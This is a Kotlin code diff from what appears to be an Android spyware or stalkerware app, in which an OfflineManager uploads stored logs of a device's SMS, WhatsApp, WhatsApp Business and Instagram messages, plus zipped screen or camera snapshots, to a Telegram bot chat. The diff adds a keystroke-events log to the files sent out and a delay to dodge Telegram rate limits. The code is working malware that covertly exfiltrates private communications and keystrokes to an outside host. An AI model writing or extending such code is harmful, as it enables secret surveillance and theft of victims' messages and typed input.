@@ -149,7 +149,8 @@ object OfflineManager {
             "sms_alrt/offline/offline_sms.txt" to BotMessages.FetchOps.buildOfflineSmsLogCaption(),
             "whatsapp/offline/offline_whatsapp.txt" to BotMessages.FetchOps.buildOfflineWhatsAppLogCaption(),
             "wabusiness/offline/offline_wabusiness.txt" to BotMessages.FetchOps.buildOfflineWABusinessLogCaption(),
-            "instagram/offline/offline_instagram.txt" to BotMessages.FetchOps.buildOfflineInstagramLogCaption()
+            "instagram/offline/offline_instagram.txt" to BotMessages.FetchOps.buildOfflineInstagramLogCaption(),
+            "keyevents/offline/offline_keyevents.txt" to BotMessages.FetchOps.buildOfflineKeyEventsCaption()
         )
 
         for ((path, caption) in textLogPaths) {
@@ -251,6 +252,7 @@ object OfflineManager {
         if (snapshots.size > 4) {
             LogManager.log(LogCategory.BOT_ACTIVITY, "[ACTIONS]Found ${snapshots.size} offline snapshots. Batching into ZIP...")
             TelegramApi.sendMessage(token, chatId, BotMessages.MediaOps.buildOfflineZipBatchingMessage(snapshots.size))
+            delay(2000) // Delay to prevent Telegram API rate limits between message and zip
             val mediaItems = snapshots.map { MediaItem(file = it, name = it.name) }
             compressAndSendOfflineMedia(context, token, chatId, mediaItems, "offline_snapshots.zip", "Offline Snapshots Sync")
         } else {
